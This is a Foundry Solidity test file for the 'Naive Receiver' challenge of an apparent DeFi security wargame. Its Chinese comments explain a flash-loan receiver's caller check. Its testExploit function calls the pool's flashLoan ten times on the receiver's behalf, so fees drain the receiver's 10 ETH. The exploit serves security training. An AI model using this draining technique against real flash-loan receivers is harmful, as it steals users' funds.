// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {NaiveReceiverLenderPool} from "../src/naive-receiver/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "../src/naive-receiver/FlashLoanReceiver.sol";

/*  
FlashLoanReceiver
该合约实现了 IERC3156FlashBorrower 该接口，使其能够与闪电贷提供商进行交互。
它有一个构造函数，该构造函数获取借贷池的地址，它将从中借入资产。
该 onFlashLoan 功能是核心功能，由借贷池在批准闪电贷后调用。
- 检查调用方是否是预期的借贷池，以防止未经授权的访问
- 它目前只支持借入以太币（ETH地址定义为常量）。任何其他令牌都会触发还原。
- 它计算要偿还的总金额（借款金额+费用）。
- 它调用内部函数 _executeActionDuringFlashLoan ，其中借入的资金用于某些特定目的。
此功能需要由开发人员根据他们想要的用例实现。
- 最后，它用费用 SafeTransferLib.safeTransferETH 偿还全部借款金额。
- 它返回 IERC3156FlashBorrower 接口要求的特定值

assembly {
    // gas savings
    if iszero(eq(sload(pool.slot), caller())) {
        mstore(0x00, 0x48f5c3ed)
        revert(0x1c, 0x04)
    }
}

sload(pool.slot)：从合约存储中加载 pool 变量的值。该变量存储着借贷池的地址
caller()：获取当前调用合约的地址。
eq(a, b)：比较两个值是否相等。
iszero(x)：检查值是否为零。

将错误代码 0x48f5c3ed 存储到内存地址 0x00。
使用 revert 指令回滚交易，并附带错误代码和错误信息长度 (0x04)。

总结来说，这段代码用于确保只有授权的借款方才能调用 onFlashLoan 函数，并防止未经授权的访问
// 检查调用者是否为授权的借款方
if (msg.sender != pool) {
    revert("Unauthorized caller");
}
*/

contract UnstopableTest is Test {
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    address ETH;

    uint256 ETHER_IN_POOL = 1000 ether;
    uint256 ETHER_IN_RECEIVER = 10 ether;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public excuteByUser(deployer) {
        pool = new NaiveReceiverLenderPool();
        receiver = new FlashLoanReceiver(address(pool));

        deal(address(pool), ETHER_IN_POOL);
        deal(address(receiver), ETHER_IN_RECEIVER);

        ETH = pool.ETH();
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(pool.maxFlashLoan(ETH), ETHER_IN_POOL);
        assertEq(pool.flashFee(ETH, 0), 1 ether);

        // only pool contract excute
        vm.expectRevert();
        receiver.onFlashLoan(deployer, ETH, ETHER_IN_RECEIVER, 1e18, "0x");
    }

    function testExploit() public excuteByUser(player) {
        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, ETHER_IN_RECEIVER, "0x");
        }
        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}
